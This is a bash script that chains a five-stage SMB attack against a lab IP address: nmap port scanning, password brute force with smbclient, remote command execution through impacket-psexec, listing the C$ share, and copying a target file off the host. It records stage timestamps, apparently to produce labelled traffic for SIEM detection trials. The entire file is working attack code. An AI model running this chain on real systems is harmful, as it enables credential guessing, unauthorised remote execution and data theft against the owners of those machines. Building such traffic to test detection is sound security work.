#!/bin/bash

# --- CONFIGURATION ---
TARGET_IP="10.0.3.10"
USER="victim"
PASS_LIST="passwords.txt"
CORRECT_PASS="1234"
TARGET_FILE="bootTel.dat"
LOG_FILE="trial_timestamps.txt"

# --- CLEANUP ---
# Remove local copies to ensure a fresh exfiltration run
rm -f $TARGET_FILE
echo "--- NEW TRIAL STARTED: $(date) ---" >> $LOG_FILE

# --- STAGE 1: RECONNAISSANCE ---
echo "[+] Starting Stage 1: Recon (Nmap)"
ST1_TIME=$(date "+%Y-%m-%d %H:%M:%S")
echo "Stage 1 Start: $ST1_TIME" >> $LOG_FILE
nmap -Pn -p 135,445 $TARGET_IP > /dev/null
sleep 5 # Brief pause to keep SIEM histograms clean

# --- STAGE 2: BRUTE FORCE ---
echo "[+] Starting Stage 2: Brute Force (SMB)"
ST2_TIME=$(date "+%Y-%m-%d %H:%M:%S")
echo "Stage 2 Start: $ST2_TIME" >> $LOG_FILE
for p in $(cat $PASS_LIST); do
    smbclient -L //$TARGET_IP -U $USER%$p > /dev/null 2>&1
    sleep 0.5 # Mimics a realistic automated attack speed
done
sleep 5

# --- STAGE 3: EXECUTION ---
echo "[+] Starting Stage 3: Execution (PsExec)"
ST3_TIME=$(date "+%Y-%m-%d %H:%M:%S")
echo "Stage 3 Start: $ST3_TIME" >> $LOG_FILE
# Note: Impacket might take a moment to clean up, which is normal
impacket-psexec $USER:"$CORRECT_PASS"@$TARGET_IP "whoami"
sleep 5

# --- STAGE 4: LATERAL MOVEMENT ---
echo "[+] Starting Stage 4: Lateral Movement (LS)"
ST4_TIME=$(date "+%Y-%m-%d %H:%M:%S")
echo "Stage 4 Start: $ST4_TIME" >> $LOG_FILE
smbclient //$TARGET_IP/C$ -U $USER%$CORRECT_PASS -c 'ls' > /dev/null
sleep 2

# --- STAGE 5: EXFILTRATION ---
echo "[+] Starting Stage 5: Exfiltration (GET)"
ST5_TIME=$(date "+%Y-%m-%d %H:%M:%S")
echo "Stage 5 Start: $ST5_TIME" >> $LOG_FILE
smbclient //$TARGET_IP/C$ -U $USER%$CORRECT_PASS -c "get $TARGET_FILE"
echo "--- TRIAL COMPLETE ---" >> $LOG_FILE
echo "" >> $LOG_FILE

echo "[!] Attack Complete. Timestamps saved to: $LOG_FILE"
